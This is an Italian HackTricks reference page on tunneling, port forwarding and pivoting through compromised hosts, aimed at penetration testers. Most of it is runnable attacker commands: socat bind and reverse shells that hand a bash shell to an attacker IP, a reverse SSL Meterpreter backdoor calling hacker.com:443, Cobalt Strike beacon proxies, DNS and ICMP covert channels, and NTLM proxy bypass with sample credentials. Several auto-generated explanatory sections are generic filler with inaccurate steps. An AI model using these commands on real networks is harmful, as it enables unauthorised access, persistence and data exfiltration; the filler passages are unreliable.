# Tunneling e Port Forwarding

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Suggerimento Nmap

{% hint style="warning" %}
Gli scansione **ICMP** e **SYN** non possono essere tunnelizzate tramite proxy socks, quindi dobbiamo **disabilitare la scoperta del ping** (`-Pn`) e specificare **scansioni TCP** (`-sT`) perché funzioni.
{% endhint %}

## **Bash**

**Host -> Salto -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Connessione grafica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Porta Locale2Locale

Aprire una nuova porta nel server SSH --> Altra porta
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Porta2Porta

Porta locale --> Host compromesso (SSH) --> Terza\_scatola:Porta
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port locale --> Host compromesso (SSH) --> Ovunque
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Inoltro di porta inverso

Questo è utile per ottenere shell inverse da host interni attraverso una DMZ verso il tuo host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

È necessario avere **privilegi di root su entrambi i dispositivi** (poiché si creeranno nuove interfacce) e la configurazione di sshd deve consentire l'accesso come root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Abilitare l'inoltro sul lato del Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Imposta una nuova rotta sul lato client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Puoi **tunnelizzare** tutto il **traffico** di una **sottorete** attraverso un host utilizzando **ssh**.\
Ad esempio, inoltrando tutto il traffico diretto a 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Connettersi con una chiave privata
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Porta locale --> Host compromesso (sessione attiva) --> Terza\_box:Porta
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS (Socket Secure) è un protocollo di rete che consente ai client di instradare il proprio traffico Internet attraverso un server proxy. Questo protocollo è ampiamente utilizzato per il tunneling e il port forwarding, consentendo agli utenti di bypassare le restrizioni di rete e accedere a risorse altrimenti non accessibili. SOCKS può essere utilizzato per instradare il traffico TCP e UDP, fornendo una soluzione flessibile per le esigenze di tunneling.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Un altro modo:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Proxy SOCKS

Apri una porta nel teamserver in ascolto su tutte le interfacce che possono essere utilizzate per **instradare il traffico attraverso il beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
In questo caso, la **porta viene aperta nell'host beacon**, non nel Team Server e il traffico viene inviato al Team Server e da lì all'host:porta indicato.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Da notare:

- Il reverse port forward di Beacon è progettato per **inoltrare il traffico al Team Server, non per fare da tramite tra macchine individuali**.
- Il traffico viene **inoltrato all'interno del traffico C2 di Beacon**, compresi i collegamenti P2P.
- **Non sono necessari privilegi di amministratore** per creare reverse port forward su porte elevate.

### rPort2Port locale

{% hint style="warning" %}
In questo caso, la **porta viene aperta nell'host di Beacon**, non nel Team Server e il **traffico viene inviato al client di Cobalt Strike** (non al Team Server) e da lì all'host:porta indicato.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

È necessario caricare un tunnel di file web: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Puoi scaricarlo dalla pagina delle release di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Devi utilizzare **la stessa versione per il client e il server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding

Il port forwarding, noto anche come inoltro di porta, è una tecnica utilizzata per instradare il traffico di rete da un determinato indirizzo IP e porta a un altro. Questa tecnica è spesso utilizzata per consentire l'accesso a risorse di rete interne da parte di dispositivi esterni alla rete locale.

Il port forwarding può essere utile in diversi scenari, come ad esempio quando si desidera accedere a un server web o a un'applicazione su una macchina locale da un dispositivo remoto. Invece di esporre direttamente la macchina locale su Internet, è possibile configurare il port forwarding per instradare il traffico attraverso un indirizzo IP e una porta specifici.

Esistono due tipi principali di port forwarding: locale e remoto. Nel port forwarding locale, il traffico viene instradato da un dispositivo esterno alla rete locale verso una macchina specifica all'interno della rete. Nel port forwarding remoto, il traffico viene instradato da una macchina all'interno della rete locale verso un dispositivo esterno.

Per configurare il port forwarding, è necessario accedere alle impostazioni del router o del firewall utilizzato nella rete. È possibile specificare l'indirizzo IP e la porta di destinazione a cui instradare il traffico. Inoltre, è possibile specificare il protocollo di rete da utilizzare, come TCP o UDP.

Una volta configurato il port forwarding, il traffico verrà instradato automaticamente verso la destinazione specificata. Questo consente di accedere alle risorse di rete interne da dispositivi esterni, senza dover esporre direttamente la rete locale su Internet.

Tuttavia, è importante tenere presente che il port forwarding può comportare alcuni rischi per la sicurezza. Se non configurato correttamente, potrebbe consentire a utenti non autorizzati di accedere alle risorse di rete interne. Pertanto, è consigliabile prendere precauzioni aggiuntive, come l'utilizzo di autenticazione forte o l'implementazione di un firewall per limitare l'accesso al traffico instradato.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Tunnel inverso. Il tunnel viene avviato dalla vittima.\
Viene creato un proxy socks4 su 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot tramite **proxy NTLM**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Shell di bind

Il **bind shell** è una tecnica di tunneling che consente di aprire una shell su una macchina remota e di collegarsi ad essa. Socat è uno strumento molto utile per creare un bind shell. Puoi trovare una versione statica di Socat su [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries).
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Shell inversa

Una shell inversa è una tecnica utilizzata dai hacker per ottenere l'accesso a un sistema remoto. Invece di connettersi direttamente al sistema di destinazione, l'hacker crea una connessione da parte del sistema di destinazione al proprio sistema. Questo permette all'hacker di controllare il sistema di destinazione e di eseguire comandi come se fosse connesso direttamente ad esso.

La shell inversa può essere ottenuta utilizzando diversi metodi, tra cui:

- Utilizzo di un payload di shell inversa: l'hacker inserisce un payload nel sistema di destinazione, che si connette al sistema dell'hacker quando viene eseguito.
- Utilizzo di un tunneling: l'hacker crea un tunnel tra il sistema di destinazione e il proprio sistema, consentendo la comunicazione bidirezionale tra i due.

La shell inversa è una tecnica molto potente utilizzata dagli hacker durante le attività di hacking e di penetration testing. Tuttavia, è importante notare che l'utilizzo di una shell inversa senza il consenso del proprietario del sistema è illegale e può comportare conseguenze legali gravi.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Porta2Porta

Port2Port is a technique used in network security to establish a connection between two different ports on a network. It is commonly used in situations where direct communication between the two ports is not possible due to network restrictions or firewalls.

Port2Port works by creating a tunnel between a local port on the attacker's machine and a remote port on the target machine. This allows the attacker to bypass any network restrictions and communicate with the target machine through the established tunnel.

To set up a Port2Port connection, the attacker needs to use a tool or software that supports tunneling and port forwarding. This can be done using tools like SSH, VPN, or proxy servers.

Once the Port2Port connection is established, the attacker can use it to perform various tasks, such as accessing restricted services, bypassing firewalls, or exfiltrating data from the target machine.

It is important to note that Port2Port can be used for both legitimate and malicious purposes. While it can be a useful technique for network administrators and security professionals, it can also be exploited by attackers to gain unauthorized access to systems or perform malicious activities.

To protect against Port2Port attacks, network administrators should implement proper security measures, such as firewall rules, network segmentation, and monitoring tools. Regular vulnerability assessments and penetration testing can also help identify and mitigate any potential vulnerabilities in the network.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Porta2Porta tramite socks

Sometimes, you may need to establish a connection between two ports on different systems using a SOCKS proxy. This can be useful in scenarios where direct communication between the systems is not possible or allowed.

To achieve this, you can use the `socat` tool, which is a versatile network utility that can create bidirectional connections between two endpoints. Here's an example of how you can use `socat` to establish a port-to-port connection through a SOCKS proxy:

```bash
socat TCP-LISTEN:<local_port>,fork SOCKS4A:<proxy_host>:<remote_host>:<remote_port>,socksport=<proxy_port>
```

In the command above, replace `<local_port>` with the local port number you want to listen on, `<proxy_host>` with the hostname or IP address of the SOCKS proxy, `<remote_host>` with the hostname or IP address of the remote system, and `<remote_port>` with the port number on the remote system you want to connect to.

For example, if you want to establish a connection between local port 8080 and remote port 22 through a SOCKS proxy at `proxy.example.com` on port 1080, the command would be:

```bash
socat TCP-LISTEN:8080,fork SOCKS4A:proxy.example.com:localhost:22,socksport=1080
```

This will create a tunnel between the local port 8080 and the remote port 22, allowing you to access the remote system's SSH service through the SOCKS proxy.

Remember to adjust the command according to your specific requirements, such as the proxy type (SOCKS4, SOCKS5), authentication, and any additional options that may be necessary.

Keep in mind that using SOCKS proxies for port forwarding can introduce additional latency and may not be as efficient as direct connections.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter tramite SSL Socat

Socat è uno strumento versatile che consente di creare tunnel e inoltrare porte. In questo caso, utilizzeremo Socat per creare un tunnel SSL per Meterpreter.

1. Assicurati di avere Socat installato sul tuo sistema.

2. Genera un certificato SSL autofirmato utilizzando il comando seguente:
```
openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes
```

3. Avvia un listener Meterpreter sul tuo sistema di destinazione:
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <indirizzo IP>
set LPORT <porta>
exploit
```

4. Avvia Socat per creare il tunnel SSL:
```
socat OPENSSL-LISTEN:<porta>,cert=server.crt,key=server.key,verify=0,fork TCP:<indirizzo IP>:<porta>
```

Assicurati di sostituire `<porta>` con la porta desiderata e `<indirizzo IP>` con l'indirizzo IP del sistema di destinazione.

5. Una volta che Socat è in esecuzione, il traffico Meterpreter verrà inoltrato attraverso il tunnel SSL.

Questa tecnica può essere utile per bypassare le restrizioni di rete o per nascondere il traffico Meterpreter all'interno di una connessione SSL crittografata.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
È possibile bypassare un **proxy non autenticato** eseguendo questa riga al posto dell'ultima nella console della vittima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunnel SSL con Socat

**Console /bin/sh**

Creare certificati su entrambi i lati: Client e Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Porta remota a porta

Connetti la porta SSH locale (22) alla porta 443 dell'host dell'attaccante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

È come una versione console di PuTTY (le opzioni sono molto simili a un client ssh).

Poiché questo file binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo la porta accessibile localmente a una porta nella nostra macchina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Porta a Porta

È necessario essere un amministratore locale (per qualsiasi porta)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

È necessario avere **accesso RDP al sistema**.\
Scarica:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza i `Dynamic Virtual Channels` (`DVC`) della funzionalità Remote Desktop Service di Windows. DVC è responsabile del **tunneling dei pacchetti sulla connessione RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Nel tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **prompt** che indica che il plugin **SocksOverRDP è abilitato**, e che sarà in ascolto su **127.0.0.1:1080**.

**Connettiti** tramite **RDP** e carica ed esegui nella macchina della vittima il file binario `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ora, conferma sulla tua macchina (attaccante) che la porta 1080 sia in ascolto:
```
netstat -antb | findstr 1080
```
Ora puoi utilizzare [**Proxifier**](https://www.proxifier.com/) **per instradare il traffico attraverso quella porta.**

## Proxify delle applicazioni GUI di Windows

Puoi far navigare le applicazioni GUI di Windows attraverso un proxy utilizzando [**Proxifier**](https://www.proxifier.com/).\
In **Profilo -> Server Proxy** aggiungi l'IP e la porta del server SOCKS.\
In **Profilo -> Regole di Proxification** aggiungi il nome del programma da proxificare e le connessioni agli IP che desideri proxificare.

## Bypass del proxy NTLM

Lo strumento precedentemente menzionato: **Rpivot**\
**OpenVPN** può anche bypassarlo, impostando queste opzioni nel file di configurazione:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Autentica un proxy e associa localmente una porta che viene inoltrata al servizio esterno specificato. Successivamente, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
Ad esempio, inoltra la porta 443.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Ora, se imposti ad esempio sulla vittima il servizio **SSH** per ascoltare sulla porta 443. Puoi connetterti ad esso tramite la porta 2222 dell'attaccante.\
Potresti anche utilizzare un **meterpreter** che si connette a localhost:443 e l'attaccante è in ascolto sulla porta 2222.

## YARP

Un proxy inverso creato da Microsoft. Puoi trovarlo qui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## Tunneling DNS

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

È necessario avere i permessi di root in entrambi i sistemi per creare adattatori tun e tunnel dati tra di essi utilizzando le query DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Il tunnel sarà molto lento. Puoi creare una connessione SSH compressa attraverso questo tunnel utilizzando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Scaricalo da qui**](https://github.com/iagox86/dnscat2)**.**

Crea un canale C\&C attraverso DNS. Non richiede privilegi di root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Puoi utilizzare [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) per eseguire un client dnscat2 in powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding con dnscat**

Dnscat è uno strumento versatile che può essere utilizzato per il port forwarding. Funziona sfruttando il protocollo DNS per inviare e ricevere dati attraverso il traffico DNS. Questo può essere utile quando si desidera bypassare le restrizioni di rete o quando si desidera accedere a una porta remota attraverso un firewall.

Per utilizzare dnscat per il port forwarding, è necessario eseguire i seguenti passaggi:

1. Installare dnscat sul computer locale e sul computer remoto.
2. Avviare il server dnscat sul computer remoto utilizzando il comando `dnscat2 --dns <DNS_SERVER_IP>`.
3. Avviare il client dnscat sul computer locale utilizzando il comando `dnscat2 --dns <DNS_SERVER_IP> --dns-port <DNS_SERVER_PORT>`.
4. Creare un tunnel utilizzando il comando `tunnel <LOCAL_PORT>:<REMOTE_HOST>:<REMOTE_PORT>`.
5. Ora è possibile accedere alla porta remota utilizzando `localhost:<LOCAL_PORT>` sul computer locale.

È importante notare che dnscat può essere rilevato e bloccato dai sistemi di sicurezza, quindi è consigliabile utilizzarlo con cautela e solo per scopi legittimi.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Cambiare il DNS di proxychains

Proxychains intercetta la chiamata libc `gethostbyname` e instrada la richiesta tcp DNS tramite il proxy socks. Per **default**, il server **DNS** utilizzato da proxychains è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'indirizzo IP. Se ti trovi in un ambiente **Windows**, puoi impostare l'IP del **domain controller**.

## Tunnel in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunnel ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di eco ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Scaricalo da qui**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) è uno strumento per esporre soluzioni su Internet in una sola riga di comando.**
*Gli URI di esposizione sono simili a:* **UID.ngrok.io**

### Installazione

- Crea un account: https://ngrok.com/signup
- Download del client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Utilizzi di base

**Documentazione:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*È anche possibile aggiungere autenticazione e TLS, se necessario.*

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Esposizione di file con HTTP

Sometimes during a penetration test, you may come across a situation where you need to expose files using the HTTP protocol. This can be useful when you want to share files with others or when you need to access files remotely.

To expose files with HTTP, you can use a web server such as Apache or Nginx. These web servers allow you to serve files over the HTTP protocol, making them accessible to anyone with the appropriate URL.

Here are the steps to expose files using Apache:

1. Install Apache on your machine.
2. Configure Apache to serve files from a specific directory. This can be done by modifying the Apache configuration file (`httpd.conf`) and specifying the `DocumentRoot` directive.
3. Place the files you want to expose in the specified directory.
4. Start the Apache web server.
5. Access the files using the appropriate URL, which will typically be in the format `http://<your_ip>/<file_name>`.

Similarly, you can use Nginx to expose files with HTTP. The steps are similar to those for Apache:

1. Install Nginx on your machine.
2. Configure Nginx to serve files from a specific directory. This can be done by modifying the Nginx configuration file (`nginx.conf`) and specifying the `root` directive.
3. Place the files you want to expose in the specified directory.
4. Start the Nginx web server.
5. Access the files using the appropriate URL, which will typically be in the format `http://<your_ip>/<file_name>`.

By following these steps, you can easily expose files using the HTTP protocol and make them accessible to others or access them remotely.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing chiamate HTTP

*Utile per XSS, SSRF, SSTI ...*
Direttamente da stdout o nell'interfaccia HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling servizio HTTP interno
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Esempio di configurazione semplice di ngrok.yaml

Apre 3 tunnel:
- 2 TCP
- 1 HTTP con esposizione di file statici da /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Altri strumenti da controllare

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
